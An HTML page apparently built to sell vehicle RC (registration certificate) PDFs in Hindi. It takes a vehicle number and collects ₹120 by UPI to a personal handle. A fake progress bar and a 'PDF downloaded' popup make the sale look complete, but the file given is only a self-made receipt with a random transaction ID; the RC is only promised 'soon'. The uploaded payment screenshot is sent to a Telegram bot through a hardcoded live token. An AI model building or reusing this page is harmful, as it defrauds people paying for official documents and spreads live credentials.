<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RCPDF.IN</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI}

body{
background:linear-gradient(-45deg,#ff0066,#005BAC,#00c6ff,#00ff99);
background-size:400% 400%;
animation:bg 8s infinite;
display:flex;flex-direction:column;align-items:center;
}
@keyframes bg{0%{background-position:0%}50%{background-position:100%}100%{background-position:0%}}

.topbar{
position:fixed;top:0;width:100%;
background:#fff;padding:10px;
display:flex;justify-content:flex-end;
z-index:1000;
}
.homeBtn{
background:#ff0066;color:#fff;
padding:6px 10px;font-size:14px;
border-radius:6px;
}

/* MENU */
.menu-icon{position:fixed;left:10px;top:10px;cursor:pointer}
.menu-icon div{width:22px;height:3px;background:#ff0066;margin:4px 0}
.sideMenu{
position:fixed;right:-260px;top:0;width:250px;height:100%;
background:#fff;padding-top:80px;transition:0.3s;
}
.sideMenu button{
width:90%;margin:10px 5%;padding:12px;
background:#ff0066;color:#fff;border:none;border-radius:8px;
}
.openMenu{right:0}

/* CARD */
.card{
margin-top:100px;background:rgba(255,255,255,0.2);
padding:20px;border-radius:15px;width:90%;max-width:400px;text-align:center;
}
input{width:100%;padding:12px;margin-top:10px;border-radius:8px;border:none}

button{
width:100%;padding:12px;margin-top:10px;
background:#000;color:#fff;border:none;border-radius:8px;
box-shadow:0 5px 0 #333;
}
button:active{transform:translateY(3px);box-shadow:0 2px 0 #333}

.qr{width:200px;margin-top:10px}

/* LOADER */
.loader{
position:fixed;top:0;left:0;width:100%;height:100%;
background:#fff;display:none;
flex-direction:column;justify-content:center;align-items:center;
}
.barBox{width:80%;background:#ddd}
.bar{height:20px;background:#ff0066;width:0%}

.popup{
position:fixed;top:50%;left:50%;
transform:translate(-50%,-50%);
background:#fff;padding:20px;border-radius:10px;
display:none;
}
</style>
</head>

<body>

<div class="topbar">
<button class="homeBtn" onclick="location.reload()">🏠</button>
</div>

<div class="menu-icon" onclick="menu.classList.toggle('openMenu')">
<div></div><div></div><div></div>
</div>

<div class="sideMenu" id="menu">
<button onclick="window.location.href='https://insurancebju.blogspot.com'">Insurance</button>
<button>About</button>
<button>Disclaimer</button>
<button onclick="window.location.href='https://t.me/yourtelegramusername'">Contact</button>
</div>

<div class="card">

<div id="page1">
<h3>गाड़ी नंबर डालें</h3>
<input id="vehicle" placeholder="BR-09-AB-1234" oninput="formatVehicle(this)">
<button onclick="goNext()">आगे बढ़ें</button>
</div>

<div id="page2" style="display:none">
<h3>₹120 भुगतान करें</h3>

<button onclick="payUPI()">Pay with UPI</button>

<img id="qrImg" class="qr"
src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=upi%3A%2F%2Fpay%3Fpa%3D8709610091%40okbizaxis%26am%3D120%26cu%3DINR">

<input id="mobile" placeholder="मोबाइल नंबर">
<input type="file" id="proof">

<button onclick="submitForm()">सबमिट करें</button>
</div>

</div>

<div class="loader" id="loader">
<div class="barBox"><div class="bar" id="bar"></div></div>
<div id="percent">0%</div>
<div>इंटरनेट धीमा है कृपया BACK न दबाएं</div>
</div>

<div class="popup" id="popup">
<h2>🎉 बधाई हो</h2>
<p>आपका PDF डाउनलोड हो गया है</p>
<button onclick="location.reload()">OK</button>
</div>

<script>

function formatVehicle(i){
let v=i.value.replace(/[^A-Z0-9]/gi,'').toUpperCase();
if(v.length>2)v=v.slice(0,2)+"-"+v.slice(2);
if(v.length>5)v=v.slice(0,5)+"-"+v.slice(5);
if(v.length>8)v=v.slice(0,8)+"-"+v.slice(8,12);
i.value=v;
}

function goNext(){page1.style.display="none";page2.style.display="block";}
function payUPI(){window.location.href="upi://pay?pa=8709610091@okbizaxis&am=120&cu=INR";}

function downloadPDF(){

const { jsPDF } = window.jspdf;
let pdf = new jsPDF();

let txn="TXN"+Math.floor(Math.random()*999999);
let d=new Date();

/* HEADER */
pdf.setFillColor(0,91,172);
pdf.rect(0,0,210,20,"F");
pdf.setTextColor(255,255,255);
pdf.text("RCPDF.IN",105,13,null,null,"center");

pdf.setTextColor(0,0,0);

/* BOX */
pdf.rect(10,30,190,60);

pdf.text("Vehicle: "+vehicle.value,20,40);
pdf.text("Mobile: "+mobile.value,20,48);
pdf.text("Work: RC Download",20,56);
pdf.text("Transaction ID: "+txn,20,64);
pdf.text("Date: "+d.toLocaleDateString(),20,72);
pdf.text("Time: "+d.toLocaleTimeString(),20,80);

/* QR */
pdf.addImage(document.getElementById("qrImg").src,"PNG",60,95,90,90);

/* TERMS */
pdf.setFontSize(8);
let y=195;
pdf.text("• यह वेबसाइट RTO से किसी भी प्रकार से जुड़ी नहीं है",10,y); y+=5;
pdf.text("• हम जानकारी की पूर्ण सत्यता की पुष्टि नहीं करते",10,y); y+=5;
pdf.text("• यह साइट केवल जानकारी हेतु है",10,y); y+=5;
pdf.text("• गलत उपयोग की जिम्मेदारी उपयोगकर्ता की होगी",10,y); y+=5;
pdf.text("• भुगतान के बाद धनवापसी नहीं होगी",10,y); y+=5;
pdf.text("• भुगतान करना सभी शर्तों की स्वीकृति है",10,y); y+=5;
pdf.text("• RC PDF जल्द ही आपके नंबर पर भेज दी जाएगी",10,y);

pdf.save("RC.pdf");
}

function submitForm(){

loader.style.display="flex";

let p=0;
let i=setInterval(()=>{
p++;
bar.style.width=p+"%";
percent.innerText=p+"%";

if(p>=100){
clearInterval(i);

downloadPDF();

/* TELEGRAM */
let d=new FormData();
d.append("chat_id","5600045707");
d.append("photo",proof.files[0]);

fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto",{method:"POST",body:d});

loader.style.display="none";
popup.style.display="block";
}
},40);
}

</script>

</body>
</html>
